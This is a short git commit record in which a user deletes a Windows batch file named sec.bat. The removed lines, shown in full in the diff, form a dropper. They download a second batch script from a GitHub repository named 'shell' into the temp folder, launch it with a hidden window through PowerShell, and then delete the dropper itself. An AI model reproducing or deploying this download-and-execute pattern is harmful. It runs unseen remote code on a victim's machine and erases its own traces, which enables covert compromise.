88dfac89d76ae63b787457a0788a6dca8a3dbcef
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 07:39:18 +0300

    Delete sec.bat

--- sec.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl https://raw.githubusercontent.com/0x2034/shell/main/sec1.bat -o %temp%\sec1.bat
-powershell -c "Start-Process -FilePath "%temp%\sec1.bat" -WindowStyle Hidden"
-del "%~f0"
